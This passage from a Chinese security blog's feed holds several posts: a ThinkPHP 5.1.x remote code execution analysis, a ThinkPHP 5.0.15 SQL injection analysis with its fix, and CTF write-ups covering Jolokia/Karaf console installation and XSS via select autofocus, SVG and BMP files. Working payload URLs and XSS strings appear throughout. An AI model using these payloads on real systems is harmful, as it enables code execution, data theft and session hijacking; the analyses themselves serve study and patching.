KEY-----</span><br></pre></td></tr></table></figure><p>很显然，这里加密指数e为2，采用低加密指数攻击。</p><p>参考：</p><ol><li><a href="https://www.jarvisoj.com/challenges" target="_blank" rel="noopener">jarvisoj</a></li><li><a href="https://www.anquanke.com/post/id/84632" target="_blank" rel="noopener">CTF中RSA的常见攻击方法</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近打比赛频频遇到各种学过又不会的密码学… 抽了点时间捣鼓了一下常见rsa攻击方法的原理，以后有时间继续填坑&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Crypto" scheme="http://0day.design/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5.1.x 代码执行漏洞分析</title>
    <link href="http://0day.design/2019/04/15/ThinkPHP5.1.x%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://0day.design/2019/04/15/ThinkPHP5.1.x 代码执行漏洞分析/</id>
    <published>2019-04-15T08:46:00.000Z</published>
    <updated>2019-04-15T08:43:21.323Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p><code>http://tprce/index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code></p><p><img src="http://static.zybuluo.com/Passer6y/b3x19d6f1pu5yz4crewkthn1/image_1d8ffjpn01kouopob14c9i1mt19.png" alt="image_1d8ffjpn01kouopob14c9i1mt19.png-104.1kB"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>从payload入手，在app处下断点跟入, <code>thinkphp/library/think/Request.php</code> 681行，处理兼容模式的url请求：</p><p><img src="http://static.zybuluo.com/Passer6y/sxdjzyjnpeifkhixgpxvs1z3/image_1d8fsee7h1red11t7d9e14omhgk1j.png" alt="image_1d8fsee7h1red11t7d9e14omhgk1j.png-388.5kB"></p><p>在<code>thinkphp/library/think/route/Rule.php</code> 947行<br><img src="http://static.zybuluo.com/Passer6y/o3ro7og9xlqyod0c96jda16v/image_1d8fvv9pa1aadflj4bu2b4pe81m.png" alt="image_1d8fvv9pa1aadflj4bu2b4pe81m.png-276.7kB"><br>可以看到其以<code>/</code>分割，分割成模块/控制器/操作方法</p><p>路由解析，分发到对应模块/控制器/操作方法<code>thinkphp/library/think/route/dispatch/Url.php</code> 37行</p><p><img src="http://static.zybuluo.com/Passer6y/e402mqf4g33n4fwyo4qv5dtp/image_1d8fu10u5a7gujrjgt18171llc9.png" alt="image_1d8fu10u5a7gujrjgt18171llc9.png-345.1kB"></p><p><code>thinkphp/library/think/route/dispatch/Module.php</code>  84行 <code>exec()</code>，实例化控制器<br><img src="http://static.zybuluo.com/Passer6y/v25l3t0ne9lfknxopicxs1jo/image_1d8g15qpv1foi12mihmd1826mvr36.png" alt="image_1d8g15qpv1foi12mihmd1826mvr36.png-294.2kB"></p><p>跟入该文件135行，该函数利用反射机制调用类方法，从而进行代码执行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br></pre></td></tr></table></figure></p><p>-&gt; <code>thinkphp/library/think/Container.php</code> 347行 <code>invokeFunction()</code>：<br><img src="http://static.zybuluo.com/Passer6y/9neklp8y2cmhalulvogad1bt/image_1d8g1mln71tog1ud81g4l2931d053j.png" alt="image_1d8g1mln71tog1ud81g4l2931d053j.png-387.1kB"></p><p>到这里就已经任意代码执行了。</p><blockquote><p>第一次接触反射机制，记录一下自己的理解，简单来说反射即根据目的地找来源，也就是根据已经实例化的对象来找其所属的类和类中的方法</p></blockquote><p>以上为ThinkPHP5.1.x的rce分析，ThinkPHP5.0.x有一些差异，以后来填坑。</p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>路由解析过程中没有对控制器的命名规则进行检测，导致我们可以操作任意控制器，官方修复加了正则只允许字符传入：<br><img src="http://static.zybuluo.com/Passer6y/i3q82hu9bdu5rdr6ghl1loxg/image_1d8g2fr8dkjqi9g1aah1unf18dj63.png" alt="image_1d8g2fr8dkjqi9g1aah1unf18dj63.png-173.9kB"></p><p>参考：</p><ol><li><a href="https://www.kancloud.cn/shaoguan/phpstudy/384102" target="_blank" rel="noopener">PHP反射机制原理与用法详解</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
    
      <category term="Web" scheme="http://0day.design/tags/Web/"/>
    
      <category term="代码审计" scheme="http://0day.design/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5 SQL注入漏洞分析</title>
    <link href="http://0day.design/2019/04/15/ThinkPHP5%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://0day.design/2019/04/15/ThinkPHP5 SQL注入漏洞分析/</id>
    <published>2019-04-15T01:46:00.000Z</published>
    <updated>2019-04-15T02:10:29.375Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>参考的红日安全团队的文章:<br><a href="https://github.com/Passer6y/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A51.md" target="_blank" rel="noopener">https://github.com/Passer6y/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A51.md</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>第一次用composer安装源码，记录一下配置过程：<br>用brew安装composer：<code>brew install composer</code><br>更新一下composer：<code>composer self-update</code><br>安装国内镜像源：<code>composer config -g repo.packagist composer https://packagist.laravel-china.org</code></p><p>安装漏洞环境，thinkphp 5.0.15:<br><code>composer create-project --prefer-dist topthink/think=5.0.15 tp5.0.15</code><br>将 composer.json 文件的 require 字段设置成如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;=5.4.0&quot;,</span><br><span class="line">    &quot;topthink/framework&quot;: &quot;5.0.15&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>将数据库文件，报错信息开启后，在控制器中index.php写：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Index</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        $username = request()-&gt;get(&apos;username/a&apos;);</span><br><span class="line">        db(&apos;users&apos;)-&gt;insert([&apos;username&apos; =&gt; $username]);</span><br><span class="line">        return &apos;Update success&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>paylaod:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://tp5.0.15/?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/rsmd393b1y88p4ov3ef4t5on/image_1d8d5drlc17qg1na9vcv1tt013tt9.png" alt="image_1d8d5drlc17qg1na9vcv1tt013tt9.png-97.9kB"></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>从demo代码入手：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = request()-&gt;get(&apos;username/a&apos;);   // 强制类型转换成数组</span><br><span class="line">db(&apos;users&apos;)-&gt;insert([&apos;username&apos; =&gt; $username]);</span><br><span class="line">return &apos;Update success&apos;;</span><br></pre></td></tr></table></figure></p><p>对其动态调试过程中，<code>request()-&gt;get()</code>，在thinkphp/library/think/Request.php 1093行对其数组的每个参数过滤：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public function filterExp(&amp;$value)</span><br><span class="line">&#123;</span><br><span class="line">    // 过滤查询特殊字符</span><br><span class="line">    if (is_string($value) &amp;&amp; preg_match(&apos;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT LIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&apos;, $value)) &#123;</span><br><span class="line">        $value .= &apos; &apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    // TODO 其他安全过滤</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>显然这个过滤规则是形同虚设的。</p><p>再来跟入: <code>db(&#39;users&#39;)-&gt;insert([&#39;username&#39; =&gt; $username]);</code><br>从上面payload可以发现数组的第一个值为<code>inc</code>， 是tp5新增的链式查询操作:<code>https://www.kancloud.cn/manual/thinkphp5/135178</code>,<code>Auto-increment</code>即自动创建主键字段值。</p><p>thinkphp/library/think/db/Builder.php 726行insert 数据处理后进行拼接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public function insert(array $data, $options = [], $replace = false)</span><br><span class="line">&#123;</span><br><span class="line">    // 分析并处理数据</span><br><span class="line">    $data = $this-&gt;parseData($data, $options);</span><br><span class="line">    if (empty($data)) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    $fields = array_keys($data);</span><br><span class="line">    $values = array_values($data);</span><br><span class="line"></span><br><span class="line">    $sql = str_replace(</span><br><span class="line">        [&apos;%INSERT%&apos;, &apos;%TABLE%&apos;, &apos;%FIELD%&apos;, &apos;%DATA%&apos;, &apos;%COMMENT%&apos;],</span><br><span class="line">        [</span><br><span class="line">            $replace ? &apos;REPLACE&apos; : &apos;INSERT&apos;,</span><br><span class="line">            $this-&gt;parseTable($options[&apos;table&apos;], $options),</span><br><span class="line">            implode(&apos; , &apos;, $fields),</span><br><span class="line">            implode(&apos; , &apos;, $values),</span><br><span class="line">            $this-&gt;parseComment($options[&apos;comment&apos;]),</span><br><span class="line">        ], $this-&gt;insertSql);</span><br><span class="line"></span><br><span class="line">    return $sql;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>thinkphp/library/think/db/Builder.php 118行选择了 inc模式 这里只是对数据进行清洗并没有对其进行过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">switch ($val[0]) &#123;</span><br><span class="line">    case &apos;exp&apos;:</span><br><span class="line">        $result[$item] = $val[1];</span><br><span class="line">        break;</span><br><span class="line">    case &apos;inc&apos;:</span><br><span class="line">        $result[$item] = $this-&gt;parseKey($val[1]) . &apos;+&apos; . floatval($val[2]);</span><br><span class="line">        break;</span><br><span class="line">    case &apos;dec&apos;:</span><br><span class="line">        $result[$item] = $this-&gt;parseKey($val[1]) . &apos;-&apos; . floatval($val[2]);</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数据清洗完后，value值被拼接进去：<br><img src="http://static.zybuluo.com/Passer6y/47w555l5o2ghy1cdikqnruoa/image_1d8f724ato7qe5bdh8h671j8p.png" alt="image_1d8f724ato7qe5bdh8h671j8p.png-307.5kB"></p><p>接着在对其一番预处理参数绑定后再进行查库，thinkphp/library/think/db/Connection.php 456行：<br><img src="http://static.zybuluo.com/Passer6y/931jhgsx7141uag4mtw3dlyw/image_1d8f7dfs829a11t8f5l1e8na8216.png" alt="image_1d8f7dfs829a11t8f5l1e8na8216.png-548.3kB"></p><p>同样的，从<code>thinkphp/library/think/db/Builder.php</code>可以知道，对<code>Inc</code>模式和对<code>dec</code>处理模式一样，所以同样也存在这个问题：<br><img src="http://static.zybuluo.com/Passer6y/ik5xnzy1lclz5e6ccyq4xkhg/image_1d8f9s34g1qjn1ki7irg12j71vbg3a.png" alt="image_1d8f9s34g1qjn1ki7irg12j71vbg3a.png-290.4kB"></p><p>修复过程，将<code>composer.json</code>版本修改成<code>5.0.17</code>,执行<code>composer update</code>:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">switch ($val[0]) &#123;</span><br><span class="line">    case 'exp':</span><br><span class="line">        $result[$item] = $val[1];</span><br><span class="line">        break;</span><br><span class="line">    case 'inc':</span><br><span class="line"><span class="deletion">-        $result[$item] = $this-&gt;parseKey($val[1]) . '+' . floatval($val[2]);</span></span><br><span class="line"><span class="addition">+        $result[$item] = $item . '+' . floatval($val[2]);</span></span><br><span class="line">        break;</span><br><span class="line">    case 'dec':</span><br><span class="line"><span class="deletion">-        $result[$item] = $this-&gt;parseKey($val[1]) . '-' . floatval($val[2]);</span></span><br><span class="line"><span class="addition">+        $result[$item] = $item . '-' . floatval($val[2]);</span></span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到改为拼接数组的键了：<br><img src="http://static.zybuluo.com/Passer6y/bbrlup3zenonuvidq1oi83iw/image_1d8faqgj6vr0nd8k9q8ouo9s44.png" alt="image_1d8faqgj6vr0nd8k9q8ouo9s44.png-409.2kB"></p><p>看到这里，其实有几个疑问的：</p><ol><li>为什么使用框架提供的参数方法过滤这么简单</li><li>将值换成键拼接还能注入吗？</li></ol><p>对于第一个问题，因为自己对thinkphp开发流程不熟悉原因，查阅<a href="https://www.kancloud.cn/manual/thinkphp5/118044" target="_blank" rel="noopener">文档</a>之后发现：<br><img src="http://static.zybuluo.com/Passer6y/8y2tjt5kivzwg0ma5y3bkk86/image_1d8f8g6lv13d5105o1hg7qmptdp20.png" alt="image_1d8f8g6lv13d5105o1hg7qmptdp20.png-81.1kB"><br>显然，就像上文分析的那样，默认情况下过滤就只有那些简单的关键字。</p><p>对于第二个问题，之前以为是客户端可控的传入变量的键，后来调试的时候发现是：<br><img src="http://static.zybuluo.com/Passer6y/q8k2jp76sdo9x9lv70pf04lu/image_1d8fbcjdf15o7fjp5sbc7a1o64u.png" alt="image_1d8fbcjdf15o7fjp5sbc7a1o64u.png-29.5kB"></p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>总结一下利用条件：</p><ol><li>过滤规则为默认，即无过滤</li><li>获取参数为array类型， 传入的三个参数，第一个为查询模式inc/dec，第二个未过滤为payload，第三个会进行<code>floatval()</code>类型转换，功能为递增的step</li><li>最后就是存在一个可控的insert操作了</li><li>开启报错才能报错注入</li></ol><h2 id="补更"><a href="#补更" class="headerlink" title="补更"></a>补更</h2><p>后来继续跟了一下tp5其他的注入，感觉都很鸡肋，甚至觉得不是洞..</p><p>利用思路都大同小异，传入数据默认不过滤，底层解析数据的也不过滤，最后进行一次字符串拼接。</p><p>参考：</p><ol><li><a href="https://packagist.laravel-china.org/" target="_blank" rel="noopener">Laravel China 社区维护的国内全量镜像</a></li><li><a href="https://github.com/Passer6y/ThinkPHP-Vuln" target="_blank" rel="noopener">ThinkPHP-Vuln</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
    
      <category term="Web" scheme="http://0day.design/tags/Web/"/>
    
      <category term="代码审计" scheme="http://0day.design/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>TCTF/0CTF Web1 WriteUp</title>
    <link href="http://0day.design/2019/04/13/TCTF:0CTF%20Web%20WriteUp/"/>
    <id>http://0day.design/2019/04/13/TCTF:0CTF Web WriteUp/</id>
    <published>2019-04-13T09:02:00.000Z</published>
    <updated>2019-04-13T10:04:48.855Z</updated>
    
    <content type="html"><![CDATA[<p>电脑坏了，一周没摸电脑，期间也打了几场比赛补更新一下之前的WriteUp<br><a id="more"></a></p><p>第一次打TCTF国际赛，tcl… 学到了很多关于java web和php底层的知识</p><h1 id="Ghost-Pepper"><a href="#Ghost-Pepper" class="headerlink" title="Ghost Pepper"></a>Ghost Pepper</h1><p>使用Firefox访问题目：<code>http://111.186.63.207:31337</code>，获得初始密码：<br><img src="http://static.zybuluo.com/Passer6y/no5e4jsjty4uy1yxozd4mei4/image_1d6ug0i4o1foo415gjp1aje19vrp.png" alt="image_1d6ug0i4o1foo415gjp1aje19vrp.png-68.9kB"></p><p>进入后给了一个指纹信息: <code>Powered by Jetty:// 9.3.24.v20180605</code></p><p>以前没接触过java web，简单搜索了一下，Jetty的工作原理，可以和Tomcat类比,是一个Servlet引擎，具体细节可以参考<a href="https://www.ibm.com/developerworks/cn/java/j-lo-jetty/index.html\" target="_blank" rel="noopener">IBM上的这篇文章</a></p><p>首先了解一下以下几个术语：<br><strong>JavaBeans</strong>： 是Java中一种特殊的类，可以将多个对象封装到一个对象（bean）中。特点是可序列化，提供无参构造器，提供getter方法和setter方法访问对象的属性。名称中的“Bean”是用于Java的可重用软件组件的惯用叫法。<br><strong>Mbean</strong>， 即 managed beans被管理的Beans根据上述参考文章所述，简单来说即Jetty可以安装一些扩展，可以在Mbean中对其进行定义，即可在server运行的时候将扩展加入运行。</p><p><strong>JMX</strong>,即 Java Management Extensions   Java管理扩展</p><p><strong>Jolokia</strong>,是一个利用JSON通过Http实现JMX远程管理的开源项目</p><p>在这个题中，简单测试之后发现开启了Jolokia服务，通过jolokia，可以方便通过GET/POST发送Json的操作Mbean,<a href="https://jolokia.org/reference/html/index.html" target="_blank" rel="noopener">jolokia文档</a>。<br>在文档中写道jolokia支持一些opration：<code>READ、WRITE、SEARCH、EXEC、LIST、VERSION</code>。</p><p>这里可以直接通过EXEC方法给Karaf安装一个控制台，就相当于拿到了webshell：<br>payload1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.186.63.207:31337/jolokia/exec/org.apache.karaf:name=root,type=feature/installFeature(java.lang.String)/webconsole</span><br></pre></td></tr></table></figure></p><p>payload2: post传入json数据<br><img src="http://static.zybuluo.com/Passer6y/dpsido3krgbt0vy44674pmfq/image_1d6vvbpulbe813i1e7jlvqvs49.png" alt="image_1d6vvbpulbe813i1e7jlvqvs49.png-11.5kB"></p><p>访问<a href="http://111.186.63.207:31337/system/console/gogo，flag" target="_blank" rel="noopener">http://111.186.63.207:31337/system/console/gogo，flag</a>:<br><img src="http://static.zybuluo.com/Passer6y/sq884myq98jvniomgug748nv/image_1d6vvev5g58k16ld1ih1k99j9pm.png" alt="image_1d6vvev5g58k16ld1ih1k99j9pm.png-4.9kB"></p><p>所以这里做出这题的关键在于对jolokia和karaf特性的了解，以及对新东西的文档阅读学习能力。</p><h1 id="Wallbreaker-Easy"><a href="#Wallbreaker-Easy" class="headerlink" title="Wallbreaker Easy"></a>Wallbreaker Easy</h1><p>题目链接：<a href="http://111.186.63.208:31340" target="_blank" rel="noopener">http://111.186.63.208:31340</a><br>题目给了一个一句话木马让我们bypass disable_function</p><p>参考：<br><a href="https://www.anquanke.com/post/id/103016" target="_blank" rel="noopener">Exploiting Jolokia Agent with Java EE Servers</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;电脑坏了，一周没摸电脑，期间也打了几场比赛补更新一下之前的WriteUp&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0day.design/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://0day.design/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Teaser CONFidence CTF 2019 WriteUp</title>
    <link href="http://0day.design/2019/03/25/Teaser%20CONFidence%20CTF%202019%20WriteUp/"/>
    <id>http://0day.design/2019/03/25/Teaser CONFidence CTF 2019 WriteUp/</id>
    <published>2019-03-25T13:00:00.000Z</published>
    <updated>2019-04-13T09:53:48.720Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="Web-50"><a href="#Web-50" class="headerlink" title="Web 50"></a>Web 50</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在hpdoger师傅的分享学到了很多~</p><p>题目链接：<a href="http://web50.zajebistyc.tf" target="_blank" rel="noopener">http://web50.zajebistyc.tf</a>, 貌似还没关 各位师傅可以还可以抓紧时间去玩一下</p><p>测试了一下功能点，一个注册功能(注册即登陆),一个提交漏洞报告页面(给管理员)。</p><p>一共有这么几个可控点：</p><p>注册处用户名可控，会在profile页面输出，但是尝试注册了用户名为<code>&#39;&quot;&lt;</code>敏感字符，结果是被实体编码：<br><img src="http://static.zybuluo.com/Passer6y/73my2h5cakjp0t589cwtbjnw/image_1d6itjpjb1adge7kns71dd1m4t9.png" alt="image_1d6itjpjb1adge7kns71dd1m4t9.png-43kB"></p><p>其次，在注册的时候会有一次跳转，url像下面这样：<br><img src="http://static.zybuluo.com/Passer6y/brcktd0qz0zaj6x36u5xw82r/image_1d6itne4559l1iffqnlamkv45m.png" alt="image_1d6itne4559l1iffqnlamkv45m.png-22.6kB"></p><p>抓包分析了一下，服务端强制location跳转，所以这里是不可控的。<br><img src="http://static.zybuluo.com/Passer6y/mql8xdyr9hmn775jizkg66w7/image_1d6itqtci11t66fv2n438v82h13.png" alt="image_1d6itqtci11t66fv2n438v82h13.png-207.5kB"></p><p>进到个人页面：<br><img src="http://static.zybuluo.com/Passer6y/ssxmcv156q3ocwaz9i0s2tjy/image_1d6itubg81m7rlh8c711p6ffmi1t.png" alt="image_1d6itubg81m7rlh8c711p6ffmi1t.png-60.5kB"></p><p>看到这个url，很容易想到去尝试是否有越权访问admin的问题：<br><img src="http://static.zybuluo.com/Passer6y/98o3amxhb0n2agviq1lfq7ww/image_1d6iu02d810vukbtlg51c7u1npr2a.png" alt="image_1d6iu02d810vukbtlg51c7u1npr2a.png-31.9kB"></p><p>显然，根据这两个页面的差异，我们容易想到这个题想让我们根据xss来读管理员的secret字段。</p><p>再来分析一下这个表单，有这么一些可控的点,但有实体编码，仔细看我们会发现<code>select</code>的<code>value</code>属性没有用<code>&quot;</code>包裹， 其次这里还有一个限制即图片只能<code>100*100</code>的大小<br><img src="http://static.zybuluo.com/Passer6y/vym03jj6ha72zydalhwq7nvn/image_1d6iudu0a19h7t26huad691e0u3k.png" alt="image_1d6iudu0a19h7t26huad691e0u3k.png-395.7kB"></p><p><code>select</code>标签可以使用<code>onfocus()</code>和<code>autofocus</code>配合来进行xss，payload:<br><code>30 onfocus=javascript:alert(1) autofocus</code><br><img src="http://static.zybuluo.com/Passer6y/4ddl5asdjtynpewgflyitzyv/image_1d6ivlr3sa1d1sbl3u11jarqes4e.png" alt="image_1d6ivlr3sa1d1sbl3u11jarqes4e.png-315.7kB"><br><img src="http://static.zybuluo.com/Passer6y/5y4hw7ii98gtirswfr6hvnxw/image_1d6ivlc7rv8rllo1dbq1d5kldi41.png" alt="image_1d6ivlc7rv8rllo1dbq1d5kldi41.png-71.6kB"></p><p>可以去看一下p师傅在2013年就总结了一篇各种标签的利用姿势:<a href="https://www.leavesongs.com/PENETRATION/xss-collect.html" target="_blank" rel="noopener">那些年我们没能bypass的xss filter</a></p><p>那么问题来了，这里只是self-xss，还没想到如何打出危害。</p><p>值得注意的是，上传头像的<code>filename</code>参数，虽然不能插入字符，但是可以指定任意后缀名(当然他检测了图片大小必须为100*100)，</p><p><img src="http://static.zybuluo.com/Passer6y/9ek2ndgev8rtro2iskpar3mp/image_1d6j0aoj11kassf2ep26ivnon4r.png" alt="image_1d6j0aoj11kassf2ep26ivnon4r.png-230.8kB"></p><p>(似乎也没啥用)</p><h2 id="bmp-xss"><a href="#bmp-xss" class="headerlink" title="bmp xss"></a>bmp xss</h2><p>后来发现一个图片xss的思路，原理简而言之即通过修改图片结构使得其成为一个js语法合法的文件，接着利用浏览器对内容的检测差异导致恶意图片被解析成js。</p><p>在这里，复现这个问题的时候，我使用了外国一个大牛的脚本：<a href="http://pastebin.com/04y7ee3u，" target="_blank" rel="noopener">http://pastebin.com/04y7ee3u，</a> 但意外的是，我根据教程生成了payload，但是在chrome和Firefox都尝试打开后，并没有弹窗，当时想的是服务端可能会对图片内容进行判断，从而返回的<code>content-type</code>可能不为图片，从而导致误导浏览器解析为js，后来我在ie下测试时，它弹窗了，我尝试分析其数据包，在生成的payload中会尝试用<code>img</code>和<code>script</code>标签两次加载图片：<br><img src="http://static.zybuluo.com/Passer6y/z4bqb9684vmp6zlc6q9qwonn/image_1d6k43e9q1cc41al2570ppi29q6f.png" alt="image_1d6k43e9q1cc41al2570ppi29q6f.png-34.7kB"></p><p>而当我分析这两个请求的差异，结果并无差异(但只有<code>script</code>标签会弹窗)，所以原因可想而知，出在浏览器上，猜想是浏览器会对内容判断的差异造成js执行<br><img src="http://static.zybuluo.com/Passer6y/jv4dav2bw3m9cad4hd2wseyb/image_1d6k42d1n1gsio8k1amjuec14ol62.png" alt="image_1d6k42d1n1gsio8k1amjuec14ol62.png-136.7kB"></p><p>ie在进行种别判断的时候,不单考虑content-type,还根据content内容进行判断导致。<br><img src="http://static.zybuluo.com/Passer6y/jumgb70bhmaypfat56inov4w/image_1d6k3fc9a14p66jm1ipftf62p858.png" alt="image_1d6k3fc9a14p66jm1ipftf62p858.png-118.4kB"></p><p>参考了一下IE content种别判断和图片magic bite、content_tpe之间的关系表，在文末参考链接中有原文，<br><img src="http://static.zybuluo.com/Passer6y/49qtr0zbwm6uhcn7bfo2a1jh/image_1d6k4q8k91cu4cop1v1infntfh6s.png" alt="image_1d6k4q8k91cu4cop1v1infntfh6s.png-35.5kB"></p><p>到这里可能想到bmp必须得用script引入才能触发。</p><p>但后来hpdoher师傅弱口令登了个国外队伍的号子嫖了个现成的bmp图片打到了flag..(这里挺迷惑的，不太懂他bot怎么解析的)</p><p><img src="http://static.zybuluo.com/Passer6y/olctatc655suq9fr0fo8az6y/image_1d6k6e6jqsh61shg15jk1pn612l579.png" alt="image_1d6k6e6jqsh61shg15jk1pn612l579.png-134kB"></p><p>bmpinjector.py<img src="http://static.zybuluo.com/Passer6y/fuww0zdkih2cfkdxviahic1f/image_1d6k3q8u51a68g24ot613bf10ca5l.png" alt="image_1d6k3q8u51a68g24ot613bf10ca5l.png-78.2kB"></p><h2 id="svg-xss"><a href="#svg-xss" class="headerlink" title="svg xss"></a>svg xss</h2><p>在hackone上有一个svg xss的案例: <a href="https://hackerone.com/reports/148853" target="_blank" rel="noopener">https://hackerone.com/reports/148853</a><br>将其图片长宽修改后，将payload发送<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="line">   &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;</span><br><span class="line">   &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">      alert(&apos;This app is probably vulnerable to XSS attacks!&apos;);</span><br><span class="line">   &lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/orvpov3guymp2fq5n9j9zvv5/image_1d6k708dj1sqj193mcd518141usd8j.png" 